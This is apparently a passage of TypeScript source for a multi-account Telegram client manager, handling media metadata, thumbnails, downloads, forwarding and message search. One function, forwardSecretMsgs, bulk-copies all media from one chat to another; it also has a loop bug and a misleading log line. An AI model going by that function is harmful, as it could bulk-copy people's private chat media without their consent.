meta.width || null,\r\n        height: meta.height || null,\r\n        duration: meta.duration || null,\r\n    };\r\n}\r\n\r\nexport function getUserOnlineStatus(user: Api.User): { status: string; lastSeen: string | null } {\r\n    const userStatus = user.status;\r\n    if (!userStatus) {\r\n        return { status: 'unknown', lastSeen: null };\r\n    }\r\n    if (userStatus instanceof Api.UserStatusOnline) {\r\n        return { status: 'online', lastSeen: null };\r\n    }\r\n    if (userStatus instanceof Api.UserStatusOffline) {\r\n        return {\r\n            status: 'offline',\r\n            lastSeen: userStatus.wasOnline ? toISODate(userStatus.wasOnline) : null,\r\n        };\r\n    }\r\n    if (userStatus instanceof Api.UserStatusRecently) {\r\n        return { status: 'recently', lastSeen: null };\r\n    }\r\n    if (userStatus instanceof Api.UserStatusLastWeek) {\r\n        return { status: 'lastWeek', lastSeen: null };\r\n    }\r\n    if (userStatus instanceof Api.UserStatusLastMonth) {\r\n        return { status: 'lastMonth', lastSeen: null };\r\n    }\r\n    return { status: 'unknown', lastSeen: null };\r\n}\r\n","export { default } from './TelegramManager';\r\nexport { default as TelegramManager } from './TelegramManager';\r\nexport * from './types';\r\n","import { Api } from 'telegram';\r\nimport * as fs from 'fs';\r\nimport axios from 'axios';\r\nimport bigInt from 'big-integer';\r\nimport { CustomFile } from 'telegram/client/uploads';\r\nimport { IterMessagesParams } from 'telegram/client/messages';\r\nimport { TgContext, MediaMetadataItem, FilteredMediaItem, MediaFileInfo, ThumbnailResult, MediaFileDownloadInfo, MediaListResponse, FilteredMediaListResponse, MediaQueryParams } from './types';\r\nimport {\r\n    getSearchFilter, getMediaType, extractMediaMetaFromMessage, getMediaDetails,\r\n    detectContentType, generateETag, downloadFileFromUrl, downloadWithTimeout,\r\n    processWithConcurrencyLimit,\r\n    FILE_DOWNLOAD_TIMEOUT, MAX_FILE_SIZE, TEMP_FILE_CLEANUP_DELAY,\r\n    THUMBNAIL_CONCURRENCY_LIMIT, THUMBNAIL_BATCH_DELAY_MS,\r\n} from './helpers';\r\nimport { safeGetEntityById } from './chat-operations';\r\nimport { sleep } from 'telegram/Helpers';\r\n\r\n// ---- Thumbnail ----\r\n\r\nexport async function getThumbnailBuffer(ctx: TgContext, message: Api.Message): Promise<Buffer | null> {\r\n    try {\r\n        if (message.media instanceof Api.MessageMediaPhoto) {\r\n            const sizes = (<Api.Photo>message.photo)?.sizes || [];\r\n            if (sizes.length > 0) {\r\n                const preferredSize = sizes.find((s: Api.TypePhotoSize) => (s as Api.PhotoSize).type === 'm') ||\r\n                    sizes.find((s: Api.TypePhotoSize) => (s as Api.PhotoSize).type === 'x') ||\r\n                    sizes[sizes.length - 1] ||\r\n                    sizes[0];\r\n                return await downloadWithTimeout(\r\n                    ctx.client.downloadMedia(message, { thumb: preferredSize }) as Promise<Buffer>,\r\n                    30000\r\n                );\r\n            }\r\n        } else if (message.media instanceof Api.MessageMediaDocument) {\r\n            const thumbs = message.document?.thumbs || [];\r\n            if (thumbs.length > 0) {\r\n                const preferredThumb = thumbs.find((t: Api.TypePhotoSize) => (t as Api.PhotoSize).type === 'm') ||\r\n                    thumbs[thumbs.length - 1] ||\r\n                    thumbs[0];\r\n                return await downloadWithTimeout(\r\n                    ctx.client.downloadMedia(message, { thumb: preferredThumb }) as Promise<Buffer>,\r\n                    30000\r\n                );\r\n            }\r\n        }\r\n    } catch (error) {\r\n        ctx.logger.warn(ctx.phoneNumber, `Failed to get thumbnail for message ${message.id}:`, error);\r\n    }\r\n    return null;\r\n}\r\n\r\n// ---- Message with media ----\r\n\r\nasync function getMessageWithMedia(ctx: TgContext, messageId: number, chatId: string): Promise<Api.Message> {\r\n    const entity = await safeGetEntityById(ctx, chatId);\r\n    const messages = await ctx.client.getMessages(entity, { ids: [messageId] });\r\n    const message = <Api.Message>messages[0];\r\n\r\n    if (!message || message.media instanceof Api.MessageMediaEmpty) {\r\n        throw new Error('Media not found');\r\n    }\r\n\r\n    return message;\r\n}\r\n\r\n// ---- Media file info extraction ----\r\n\r\nfunction getMediaFileInfoFromMessage(message: Api.Message): MediaFileInfo {\r\n    const media = message.media;\r\n    let contentType: string;\r\n    let filename: string;\r\n    let fileLocation: Api.TypeInputFileLocation;\r\n    let fileSize = 0;\r\n    let inputLocation: Api.Photo | Api.Document;\r\n\r\n    if (media instanceof Api.MessageMediaPhoto) {\r\n        const photo = message.photo as Api.Photo;\r\n        if (!photo || photo instanceof Api.PhotoEmpty) {\r\n            throw new Error('Photo not found in message');\r\n        }\r\n        inputLocation = photo;\r\n        contentType = 'image/jpeg';\r\n        filename = 'photo.jpg';\r\n\r\n        const data = {\r\n            id: photo.id,\r\n            accessHash: photo.accessHash,\r\n            fileReference: photo.fileReference,\r\n        };\r\n        fileLocation = new Api.InputPhotoFileLocation({ ...data, thumbSize: 'm' });\r\n\r\n        const sizes = photo?.sizes || [];\r\n        const largestSize = sizes[sizes.length - 1];\r\n        if (largestSize && 'size' in largestSize) {\r\n            fileSize = (largestSize as Api.PhotoSize).size || 0;\r\n        }\r\n    } else if (media instanceof Api.MessageMediaDocument) {\r\n        const document = media.document;\r\n        if (!document || document instanceof Api.DocumentEmpty) {\r\n            throw new Error('Document not found in message');\r\n        }\r\n        if (!(document instanceof Api.Document)) {\r\n            throw new Error('Document format not supported');\r\n        }\r\n\r\n        inputLocation = document;\r\n        const fileNameAttr = document.attributes?.find(\r\n            attr => attr instanceof Api.DocumentAttributeFilename\r\n        ) as Api.DocumentAttributeFilename;\r\n\r\n        filename = fileNameAttr?.fileName || 'document.bin';\r\n        contentType = document.mimeType || detectContentType(filename);\r\n        fileSize = typeof document.size === 'number' ? document.size : (document.size ? Number(document.size.toString()) : 0);\r\n\r\n        const data = {\r\n            id: document.id,\r\n            accessHash: document.accessHash,\r\n            fileReference: document.fileReference,\r\n        };\r\n        fileLocation = new Api.InputDocumentFileLocation({ ...data, thumbSize: '' });\r\n    } else {\r\n        throw new Error('Unsupported media type');\r\n    }\r\n\r\n    return { contentType, filename, fileLocation, fileSize, inputLocation };\r\n}\r\n\r\n// ---- Public media operations ----\r\n\r\nexport async function getMediaUrl(ctx: TgContext, message: Api.Message): Promise<string | Buffer> {\r\n    if (message.media instanceof Api.MessageMediaPhoto) {\r\n        ctx.logger.info(ctx.phoneNumber, 'messageId image:', message.id);\r\n        const photo = <Api.Photo>message.photo;\r\n        const sizes = photo?.sizes || [];\r\n        const preferredSize = sizes.find((s: Api.TypePhotoSize) => (s as Api.PhotoSize).type === 'm') ||\r\n            sizes.find((s: Api.TypePhotoSize) => (s as Api.PhotoSize).type === 'x') ||\r\n            sizes[sizes.length - 1] ||\r\n            sizes[0];\r\n\r\n        return await ctx.client.downloadMedia(message, { thumb: preferredSize || sizes[0] });\r\n    } else if (message.media instanceof Api.MessageMediaDocument &&\r\n        (message.document?.mimeType?.startsWith('video') ||\r\n            message.document?.mimeType?.startsWith('image'))) {\r\n        ctx.logger.info(ctx.phoneNumber, 'messageId video:', message.id);\r\n        const thumbs = message.document?.thumbs || [];\r\n        const preferredThumb = thumbs.find((t: Api.TypePhotoSize) => (t as Api.PhotoSize).type === 'm') ||\r\n            thumbs[thumbs.length - 1] ||\r\n            thumbs[0];\r\n\r\n        return await ctx.client.downloadMedia(message, { thumb: preferredThumb || thumbs[0] });\r\n    }\r\n    return null;\r\n}\r\n\r\nexport async function getMediaMessages(ctx: TgContext): Promise<Api.messages.Messages> {\r\n    const result = <Api.messages.Messages>await ctx.client.invoke(\r\n        new Api.messages.Search({\r\n            peer: new Api.InputPeerEmpty(),\r\n            q: '',\r\n            filter: new Api.InputMessagesFilterPhotos(),\r\n            minDate: 0,\r\n            maxDate: 0,\r\n            offsetId: 0,\r\n            addOffset: 0,\r\n            limit: 200,\r\n            maxId: 0,\r\n            minId: 0,\r\n            hash: bigInt(0),\r\n        })\r\n    );\r\n    return result;\r\n}\r\n\r\nexport async function getThumbnail(ctx: TgContext, messageId: number, chatId: string = 'me'): Promise<ThumbnailResult> {\r\n    const message = await getMessageWithMedia(ctx, messageId, chatId);\r\n    const thumbBuffer = await getThumbnailBuffer(ctx, message);\r\n\r\n    if (!thumbBuffer) {\r\n        throw new Error('Thumbnail not available for this media');\r\n    }\r\n\r\n    const etag = generateETag(messageId, chatId, `thumb-${messageId}`);\r\n\r\n    return {\r\n        buffer: thumbBuffer,\r\n        etag,\r\n        contentType: 'image/jpeg',\r\n        filename: `thumbnail_${messageId}.jpg`,\r\n    };\r\n}\r\n\r\nexport async function getMediaFileDownloadInfo(ctx: TgContext, messageId: number, chatId: string = 'me'): Promise<MediaFileDownloadInfo> {\r\n    const message = await getMessageWithMedia(ctx, messageId, chatId);\r\n    const fileInfo = getMediaFileInfoFromMessage(message);\r\n\r\n    const fileId = typeof fileInfo.inputLocation.id === 'object'\r\n        ? fileInfo.inputLocation.id.toString()\r\n        : fileInfo.inputLocation.id;\r\n    const etag = generateETag(messageId, chatId, fileId);\r\n\r\n    return { ...fileInfo, etag };\r\n}\r\n\r\nexport async function* streamMediaFile(\r\n    ctx: TgContext,\r\n    fileLocation: Api.TypeInputFileLocation,\r\n    offset: bigInt.BigInteger = bigInt(0),\r\n    limit: number = 5 * 1024 * 1024,\r\n    requestSize: number = 512 * 1024\r\n): AsyncGenerator<Buffer> {\r\n    for await (const chunk of ctx.client.iterDownload({\r\n        file: fileLocation,\r\n        offset,\r\n        limit,\r\n        requestSize,\r\n    })) {\r\n        yield chunk;\r\n    }\r\n}\r\n\r\nexport async function getMediaMetadata(ctx: TgContext, params: MediaQueryParams): Promise<MediaListResponse> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    let { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;\r\n\r\n    const hasAll = types.includes('all');\r\n    const typesToFetch: ('photo' | 'video' | 'document' | 'voice')[] = hasAll\r\n        ? ['photo', 'video', 'document', 'voice']\r\n        : types.filter(t => t !== 'all') as ('photo' | 'video' | 'document' | 'voice')[];\r\n\r\n    const queryLimit = hasAll ? (limit || 50) * typesToFetch.length : (limit || 50);\r\n    const baseQuery: Partial<IterMessagesParams> = {\r\n        ...(maxId ? { maxId } : {}),\r\n        ...(minId ? { minId } : {}),\r\n        ...(startDate && startDate instanceof Date && !isNaN(startDate.getTime()) && {\r\n            minDate: Math.floor(startDate.getTime() / 1000),\r\n        } as Partial<IterMessagesParams>),\r\n        ...(endDate && endDate instanceof Date && !isNaN(endDate.getTime()) && {\r\n            maxDate: Math.floor(endDate.getTime() / 1000),\r\n        } as Partial<IterMessagesParams>),\r\n    };\r\n\r\n    const ent = await safeGetEntityById(ctx, chatId);\r\n    ctx.logger.info(ctx.phoneNumber, 'getMediaMetadata', params);\r\n\r\n    let filteredMessages: MediaMetadataItem[];\r\n\r\n    if (typesToFetch.length === 1) {\r\n        const messages = await ctx.client.getMessages(ent, {\r\n            ...baseQuery,\r\n            limit: queryLimit,\r\n            filter: getSearchFilter(typesToFetch[0]),\r\n        });\r\n        filteredMessages = messages.map(message => extractMediaMetaFromMessage(message, chatId, typesToFetch[0]));\r\n    } else if (typesToFetch.length > 1) {\r\n        const resultsPerType = await Promise.all(\r\n            typesToFetch.map(type =>\r\n                ctx.client.getMessages(ent, {\r\n                    ...baseQuery,\r\n                    limit,\r\n                    filter: getSearchFilter(type),\r\n                }).then(msgs => msgs.map(m => extractMediaMetaFromMessage(m, chatId, type)))\r\n            )\r\n        );\r\n        if (hasAll) {\r\n            filteredMessages = resultsPerType.flat();\r\n        } else {\r\n            filteredMessages = resultsPerType.flat().sort((a, b) => b.messageId - a.messageId).slice(0, limit);\r\n        }\r\n    } else {\r\n        filteredMessages = [];\r\n    }\r\n\r\n    if (hasAll) {\r\n        const grouped = filteredMessages.reduce((acc, item) => {\r\n            if (!acc[item.type]) acc[item.type] = [];\r\n            acc[item.type].push(item);\r\n            return acc;\r\n        }, {} as Record<string, MediaMetadataItem[]>);\r\n\r\n        const groups = typesToFetch.map(mediaType => {\r\n            const items = (grouped[mediaType] || []).slice(0, limit);\r\n            const typeTotal = items.length;\r\n            const typeHasMore = (grouped[mediaType]?.length ?? 0) > limit;\r\n            const typeFirstMessageId = items.length > 0 ? items[0].messageId : undefined;\r\n            const typeLastMessageId = items.length > 0 ? items[items.length - 1].messageId : undefined;\r\n\r\n            return {\r\n                type: mediaType,\r\n                count: typeTotal,\r\n                items,\r\n                pagination: {\r\n                    page: 1, limit, total: typeTotal,\r\n                    totalPages: typeHasMore ? -1 : 1,\r\n                    hasMore: typeHasMore,\r\n                    nextMaxId: typeHasMore ? typeLastMessageId : undefined,\r\n                    firstMessageId: typeFirstMessageId,\r\n                    lastMessageId: typeLastMessageId,\r\n                },\r\n            };\r\n        });\r\n\r\n        const totalItems = filteredMessages.length;\r\n        const overallHasMore = filteredMessages.length >= queryLimit && filteredMessages.length > 0;\r\n        const overallFirstMessageId = filteredMessages.length > 0 ? filteredMessages[0].messageId : undefined;\r\n        const overallLastMessageId = filteredMessages.length > 0 ? filteredMessages[filteredMessages.length - 1].messageId : undefined;\r\n\r\n        return {\r\n            groups, pagination: {\r\n                page: 1, limit, total: totalItems,\r\n                totalPages: overallHasMore ? -1 : 1,\r\n                hasMore: overallHasMore,\r\n                nextMaxId: overallHasMore ? overallLastMessageId : undefined,\r\n                prevMaxId: maxId && filteredMessages.length > 0 ? overallFirstMessageId : undefined,\r\n                firstMessageId: overallFirstMessageId,\r\n                lastMessageId: overallLastMessageId,\r\n            },\r\n            filters: { chatId, types: ['all'], startDate: startDate?.toISOString(), endDate: endDate?.toISOString() },\r\n        };\r\n    } else {\r\n        const total = filteredMessages.length;\r\n        const hasMore = (typesToFetch.length === 1 ? filteredMessages.length >= queryLimit : filteredMessages.length === limit) && filteredMessages.length > 0;\r\n        const firstMessageId = filteredMessages.length > 0 ? filteredMessages[0].messageId : undefined;\r\n        const lastMessageId = filteredMessages.length > 0 ? filteredMessages[filteredMessages.length - 1].messageId : undefined;\r\n\r\n        return {\r\n            data: filteredMessages, pagination: {\r\n                page: 1, limit, total,\r\n                totalPages: hasMore ? -1 : 1,\r\n                hasMore,\r\n                nextMaxId: hasMore ? lastMessageId : undefined,\r\n                prevMaxId: maxId && filteredMessages.length > 0 ? firstMessageId : undefined,\r\n                firstMessageId, lastMessageId,\r\n            },\r\n            filters: { chatId, types: typesToFetch, startDate: startDate?.toISOString(), endDate: endDate?.toISOString() },\r\n        };\r\n    }\r\n}\r\n\r\nexport async function getAllMediaMetaData(ctx: TgContext, params: MediaQueryParams): Promise<MediaListResponse> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    let { chatId, types = ['all'], startDate, endDate, maxId, minId } = params;\r\n\r\n    const hasAll = types.includes('all');\r\n    const typesToFetch: ('photo' | 'video' | 'document' | 'voice')[] = hasAll\r\n        ? ['photo', 'video', 'document', 'voice']\r\n        : types.filter(t => t !== 'all') as ('photo' | 'video' | 'document' | 'voice')[];\r\n    let allMedia: MediaMetadataItem[] = [];\r\n    let hasMore = true;\r\n    let lastOffsetId = 0;\r\n    const limit = 200;\r\n\r\n    while (hasMore) {\r\n        const response = await getMediaMetadata(ctx, {\r\n            chatId, types: hasAll ? ['all'] : typesToFetch,\r\n            startDate, endDate, limit,\r\n            maxId: lastOffsetId > 0 ? lastOffsetId : undefined, minId,\r\n        });\r\n        ctx.logger.info(ctx.phoneNumber, `hasMore: ${response.pagination.hasMore}, Total: ${response.pagination.total}, nextMaxId: ${response.pagination.nextMaxId}`);\r\n\r\n        if (response.groups) {\r\n            const items = response.groups.flatMap(group => group.items || []);\r\n            allMedia = allMedia.concat(items);\r\n        } else if (response.data) {\r\n            allMedia = allMedia.concat(response.data);\r\n        }\r\n\r\n        if (!response.pagination.hasMore || !response.pagination.nextMaxId) {\r\n            hasMore = false;\r\n            ctx.logger.info(ctx.phoneNumber, 'No more messages to fetch');\r\n        } else {\r\n            lastOffsetId = response.pagination.nextMaxId;\r\n            ctx.logger.info(ctx.phoneNumber, `Fetched ${allMedia.length} messages so far`);\r\n        }\r\n        await sleep(3000);\r\n    }\r\n\r\n    if (hasAll) {\r\n        const grouped = allMedia.reduce((acc, item) => {\r\n            if (!acc[item.type]) acc[item.type] = [];\r\n            acc[item.type].push(item);\r\n            return acc;\r\n        }, {} as Record<string, MediaMetadataItem[]>);\r\n\r\n        return {\r\n            groups: typesToFetch.map(mediaType => ({\r\n                type: mediaType,\r\n                count: grouped[mediaType]?.length || 0,\r\n                items: grouped[mediaType] || [],\r\n                pagination: { page: 1, limit: grouped[mediaType]?.length || 0, total: grouped[mediaType]?.length || 0, totalPages: 1, hasMore: false },\r\n            })),\r\n            pagination: { page: 1, limit: allMedia.length, total: allMedia.length, totalPages: 1, hasMore: false },\r\n            filters: { chatId, types: ['all'], startDate: startDate?.toISOString(), endDate: endDate?.toISOString() },\r\n        };\r\n    } else {\r\n        return {\r\n            data: allMedia,\r\n            pagination: { page: 1, limit: allMedia.length, total: allMedia.length, totalPages: 1, hasMore: false },\r\n            filters: { chatId, types: typesToFetch, startDate: startDate?.toISOString(), endDate: endDate?.toISOString() },\r\n        };\r\n    }\r\n}\r\n\r\nexport async function getFilteredMedia(ctx: TgContext, params: MediaQueryParams): Promise<FilteredMediaListResponse> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n\r\n    let { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;\r\n\r\n    const hasAll = types.includes('all');\r\n    const typesToFetch: ('photo' | 'video' | 'document' | 'voice')[] = hasAll\r\n        ? ['photo', 'video', 'document', 'voice']\r\n        : types.filter(t => t !== 'all') as ('photo' | 'video' | 'document' | 'voice')[];\r\n\r\n    const queryLimit = hasAll ? (limit || 50) * typesToFetch.length : (limit || 50);\r\n\r\n    const query: Partial<IterMessagesParams> = {\r\n        limit: queryLimit,\r\n        ...(maxId ? { maxId } : {}),\r\n        ...(minId ? { minId } : {}),\r\n        ...(startDate && startDate instanceof Date && !isNaN(startDate.getTime()) && {\r\n            minDate: Math.floor(startDate.getTime() / 1000),\r\n        }),\r\n        ...(endDate && endDate instanceof Date && !isNaN(endDate.getTime()) && {\r\n            maxDate: Math.floor(endDate.getTime() / 1000),\r\n        }),\r\n    };\r\n\r\n    const ent = await safeGetEntityById(ctx, chatId);\r\n    ctx.logger.info(ctx.phoneNumber, 'getFilteredMedia', params);\r\n    const messages = await ctx.client.getMessages(ent, query);\r\n    ctx.logger.info(ctx.phoneNumber, `Fetched ${messages.length} messages`);\r\n\r\n    const filteredMessages = messages.filter(message => {\r\n        if (!message.media) return false;\r\n        const mediaType = getMediaType(message.media);\r\n        return typesToFetch.includes(mediaType);\r\n    });\r\n\r\n    ctx.logger.info(ctx.phoneNumber, `Filtered down to ${filteredMessages.length} messages`);\r\n\r\n    const mediaData: FilteredMediaItem[] = await processWithConcurrencyLimit(\r\n        filteredMessages,\r\n        async (message: Api.Message) => {\r\n            const thumbBuffer = await getThumbnailBuffer(ctx, message);\r\n            const mediaDetails = getMediaDetails(message.media as Api.MessageMediaDocument);\r\n            const baseMeta = extractMediaMetaFromMessage(message, chatId, getMediaType(message.media));\r\n\r\n            return {\r\n                ...baseMeta,\r\n                type: getMediaType(message.media),\r\n                thumbnail: thumbBuffer ? `data:image/jpeg;base64,${thumbBuffer.toString('base64')}` : undefined,\r\n                mediaDetails: mediaDetails || undefined,\r\n            };\r\n        },\r\n        THUMBNAIL_CONCURRENCY_LIMIT,\r\n        THUMBNAIL_BATCH_DELAY_MS\r\n    );\r\n\r\n    if (hasAll) {\r\n        const grouped = mediaData.reduce((acc, item) => {\r\n            if (!acc[item.type]) acc[item.type] = [];\r\n            acc[item.type].push(item);\r\n            return acc;\r\n        }, {} as Record<string, FilteredMediaItem[]>);\r\n\r\n        const groups = typesToFetch.map(mediaType => {\r\n            const items = (grouped[mediaType] || []).slice(0, limit);\r\n            const typeTotal = items.length;\r\n            const typeHasMore = (grouped[mediaType]?.length ?? 0) > limit;\r\n            const typeFirstMessageId = items.length > 0 ? items[0].messageId : undefined;\r\n            const typeLastMessageId = items.length > 0 ? items[items.length - 1].messageId : undefined;\r\n\r\n            return {\r\n                type: mediaType, count: typeTotal, items,\r\n                pagination: {\r\n                    page: 1, limit, total: typeTotal,\r\n                    totalPages: typeHasMore ? -1 : 1, hasMore: typeHasMore,\r\n                    nextMaxId: typeHasMore ? typeLastMessageId : undefined,\r\n                    firstMessageId: typeFirstMessageId, lastMessageId: typeLastMessageId,\r\n                },\r\n            };\r\n        });\r\n\r\n        const totalItems = mediaData.length;\r\n        const overallHasMore = messages.length === queryLimit && messages.length > 0;\r\n        const overallFirstMessageId = mediaData.length > 0 ? mediaData[0].messageId : undefined;\r\n        const overallLastMessageId = mediaData.length > 0 ? mediaData[mediaData.length - 1].messageId : undefined;\r\n\r\n        return {\r\n            groups, pagination: {\r\n                page: 1, limit, total: totalItems,\r\n                totalPages: overallHasMore ? -1 : 1, hasMore: overallHasMore,\r\n                nextMaxId: overallHasMore ? overallLastMessageId : undefined,\r\n                prevMaxId: maxId && mediaData.length > 0 ? overallFirstMessageId : undefined,\r\n                firstMessageId: overallFirstMessageId, lastMessageId: overallLastMessageId,\r\n            },\r\n            filters: { chatId, types: ['all'], startDate: startDate?.toISOString(), endDate: endDate?.toISOString() },\r\n        };\r\n    } else {\r\n        const total = mediaData.length;\r\n        const hasMoreResult = messages.length === queryLimit && messages.length > 0;\r\n        const firstMessageId = mediaData.length > 0 ? mediaData[0].messageId : undefined;\r\n        const lastMessageId = mediaData.length > 0 ? mediaData[mediaData.length - 1].messageId : undefined;\r\n\r\n        return {\r\n            data: mediaData, pagination: {\r\n                page: 1, limit, total,\r\n                totalPages: hasMoreResult ? -1 : 1, hasMore: hasMoreResult,\r\n                nextMaxId: hasMoreResult ? lastMessageId : undefined,\r\n                prevMaxId: maxId && mediaData.length > 0 ? firstMessageId : undefined,\r\n                firstMessageId, lastMessageId,\r\n            },\r\n            filters: { chatId, types: typesToFetch, startDate: startDate?.toISOString(), endDate: endDate?.toISOString() },\r\n        };\r\n    }\r\n}\r\n\r\nexport async function getFileUrl(ctx: TgContext, url: string, filename: string): Promise<string> {\r\n    const uniqueFilename = `${filename}_${Date.now()}_${Math.random().toString(36).substring(7)}`;\r\n    const filePath = `/tmp/${uniqueFilename}`;\r\n\r\n    try {\r\n        const response = await axios.get(url, {\r\n            responseType: 'stream',\r\n            timeout: FILE_DOWNLOAD_TIMEOUT,\r\n            maxContentLength: MAX_FILE_SIZE,\r\n            validateStatus: (status) => status >= 200 && status < 300,\r\n        });\r\n\r\n        await new Promise<void>((resolve, reject) => {\r\n            const writer = fs.createWriteStream(filePath);\r\n            writer.on('finish', () => resolve());\r\n            writer.on('error', reject);\r\n            response.data.pipe(writer);\r\n            response.data.on('error', reject);\r\n        });\r\n\r\n        setTimeout(() => {\r\n            try {\r\n                if (fs.existsSync(filePath)) {\r\n                    fs.unlinkSync(filePath);\r\n                    ctx.logger.debug(ctx.phoneNumber, `Cleaned up temp file: ${filePath}`);\r\n                }\r\n            } catch (cleanupError) {\r\n                ctx.logger.warn(ctx.phoneNumber, `Failed to cleanup temp file ${filePath}:`, cleanupError);\r\n            }\r\n        }, TEMP_FILE_CLEANUP_DELAY);\r\n\r\n        return filePath;\r\n    } catch (error) {\r\n        try {\r\n            if (fs.existsSync(filePath)) fs.unlinkSync(filePath);\r\n        } catch (_) { /* ignore cleanup errors */ }\r\n\r\n        if (error.response) {\r\n            throw new Error(`Failed to download file: HTTP ${error.response.status}`);\r\n        } else if (error.code === 'ECONNABORTED') {\r\n            throw new Error(`Failed to download file: Request timeout`);\r\n        } else {\r\n            throw new Error(`Failed to download file: ${error.message}`);\r\n        }\r\n    }\r\n}\r\n","import { Api } from 'telegram';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport bigInt from 'big-integer';\r\nimport { CustomFile } from 'telegram/client/uploads';\r\nimport { TgContext, MessageScheduleOptions, EditMessageOptions, MediaBatchOptions, VoiceMessageOptions, AlbumSendResult, ForwardResult, ScheduledMessageItem, SearchMessageItem } from './types';\r\nimport { SearchMessagesDto, SearchMessagesResponseDto, MessageMediaType } from '../dto/message-search.dto';\r\nimport { SendTgMessageDto } from '../dto/send-message.dto';\r\nimport { MediaAlbumOptions } from '../types/telegram-types';\r\nimport { contains } from '../../../utils';\r\nimport { getSearchFilter, downloadFileFromUrl, detectContentType, getMimeType, getMediaExtension, getMediaAttributes, toISODate, getMediaType, extractMediaMetaFromMessage } from './helpers';\r\nimport { safeGetEntityById } from './chat-operations';\r\n\r\nexport async function sendMessageToChat(ctx: TgContext, params: SendTgMessageDto): Promise<Api.Message> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    const { peer, parseMode, message } = params;\r\n    return await ctx.client.sendMessage(peer, { message, parseMode });\r\n}\r\n\r\nexport async function sendInlineMessage(ctx: TgContext, chatId: string, message: string, url: string): Promise<Api.Message> {\r\n    const button = { text: 'Open URL', url };\r\n    const result = await ctx.client.sendMessage(chatId, {\r\n        message,\r\n        buttons: [new Api.KeyboardButtonUrl(button)],\r\n    });\r\n    return result;\r\n}\r\n\r\nexport async function forwardSecretMsgs(ctx: TgContext, fromChatId: string, toChatId: string): Promise<ForwardResult> {\r\n    let offset = 0;\r\n    const limit = 100;\r\n    let forwardedCount = 0;\r\n    let messages: Api.Message[] = [];\r\n    do {\r\n        const messages = await ctx.client.getMessages(fromChatId, { offsetId: offset, limit });\r\n        const messageIds = messages.map((message: Api.Message) => {\r\n            offset = message.id;\r\n            if (message.id && message.media) {\r\n                return message.id;\r\n            }\r\n            return undefined;\r\n        }).filter((id): id is number => id !== undefined);\r\n        ctx.logger.info(ctx.phoneNumber, `Message IDs: ${messageIds.join(', ')}`);\r\n        if (messageIds.length > 0) {\r\n            try {\r\n                await ctx.client.forwardMessages(toChatId, {\r\n                    messages: messageIds,\r\n                    fromPeer: fromChatId,\r\n                });\r\n                forwardedCount += messageIds.length;\r\n                ctx.logger.info(ctx.phoneNumber, `Forwarded ${forwardedCount} messages`);\r\n                await sleep(5000);\r\n            } catch (error) {\r\n                ctx.logger.error(ctx.phoneNumber, 'Error occurred while forwarding messages:', error);\r\n            }\r\n            await sleep(5000);\r\n        }\r\n    } while (messages.length > 0);\r\n    ctx.logger.info(ctx.phoneNumber, 'Left the channel with ID:', toChatId);\r\n    return { forwardedCount };\r\n}\r\n\r\nexport async function forwardMessages(ctx: TgContext, fromChatId: string, toChatId: string, messageIds: number[]): Promise<number> {\r\n    const chunkSize = 30;\r\n    const totalMessages = messageIds.length;\r\n    let forwardedCount = 0;\r\n\r\n    for (let i = 0; i < totalMessages; i += chunkSize) {\r\n        const chunk = messageIds.slice(i, i + chunkSize);\r\n        try {\r\n            await ctx.client.forwardMessages(toChatId, {\r\n                messages: chunk,\r\n                fromPeer: fromChatId,\r\n            });\r\n            forwardedCount += chunk.length;\r\n            ctx.logger.info(ctx.phoneNumber, `Forwarded ${forwardedCount} / ${totalMessages} messages`);\r\n            await sleep(5000);\r\n        } catch (error) {\r\n            ctx.logger.error(ctx.phoneNumber, 'Error occurred while forwarding messages:', error);\r\n        }\r\n    }\r\n\r\n    return forwardedCount;\r\n}\r\n\r\nexport async function forwardMessage(ctx: TgContext, toChatId: string, fromChatId: string, messageId: number): Promise<void> {\r\n    try {\r\n        await ctx.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId });\r\n    } catch (error) {\r\n        ctx.logger.info(ctx.phoneNumber, 'Failed to Forward Message : ', error.errorMessage);\r\n    }\r\n}\r\n\r\nexport async function searchMessages(ctx: TgContext, params: SearchMessagesDto): Promise<SearchMessagesResponseDto> {\r\n    if (!ctx.client) throw new Error('Client not initialized');\r\n    const finalResult: SearchMessagesResponseDto = {\r\n        video: { messages: [], total: 0 },\r\n        photo: { messages: [], total: 0 },\r\n        document: { messages: [], total: 0 },\r\n        voice: { messages: [], total: 0 },\r\n        text: { messages: [], total: 0 },\r\n        all: { messages: [], total: 0 },\r\n        roundVideo: { messages: [], total: 0 },\r\n        roundVoice: { messages: [], total: 0 },\r\n    };\r\n    const { chatId, query = '', types = [MessageMediaType.ALL, MessageMediaType.TEXT, MessageMediaType.PHOTO, MessageMediaType.VIDEO, MessageMediaType.VOICE, MessageMediaType.DOCUMENT, MessageMediaType.ROUND_VIDEO, MessageMediaType.ROUND_VOICE], maxId, minId, limit } = params;\r\n    ctx.logger.info(ctx.phoneNumber, 'Types: ', types);\r\n\r\n    // Pre-compute unwanted texts Set for O(1) lookup\r\n    const unwantedTexts = new Set([\r\n        'movie', 'series', 'tv show', 'anime', 'x264', 'aac', '720p', '1080p', 'dvd',\r\n        'paidgirl', 'join', 'game', 'free', 'download', 'torrent', 'link', 'invite',\r\n        'invite link', 'invitation', 'invitation link', 'customers', 'confirmation', 'earn', 'book', 'paper', 'pay',\r\n        'qr', 'invest', 'tera', 'disk', 'insta', 'mkv', 'sub', '480p', 'hevc', 'x265', 'bluray',\r\n        'mdisk', 'diskwala', 'online', 'watch', 'click', 'episode', 'season', 'part', 'action',\r\n        'adventure', 'comedy', 'drama', 'fantasy', 'horror', 'mystery', 'romance', 'sci-fi', 'thriller',\r\n        'demo', 'dress', 'netlify', 'service', 'follow', 'like', 'comment', 'share', 'subscribe',\r\n        'premium', 'unlock', 'access', 'exclusive', 'limited', 'offer', 'deal',\r\n        'discount', 'sale', 'free trial', 'free access', 'free download', 'free gift', 'freebie',\r\n        'crypto', 'currency', 'coin', 'blockchain', 'wallet', 'exchange', 'trading', 'investment',\r\n    ]);\r\n\r\n    function containsUnwanted(text: string): boolean {\r\n        const lower = text.toLowerCase();\r\n        for (const term of unwantedTexts) {\r\n            if 